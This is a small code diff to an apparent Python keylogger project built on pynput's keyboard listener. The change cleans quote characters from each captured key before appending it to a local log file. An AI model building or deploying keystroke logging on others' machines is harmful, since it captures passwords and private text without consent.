@@ -5,9 +5,10 @@ from pynput.keyboard import Listener
 
 # Append
 def appendtofile(key):
-    data = str(key)
+    letter = str(key)
+    letter = letter.replace("'",'')
     with open('keylogger/log.txt','a') as f:
-        f.write(data)
+        f.write(letter)
 
 
 
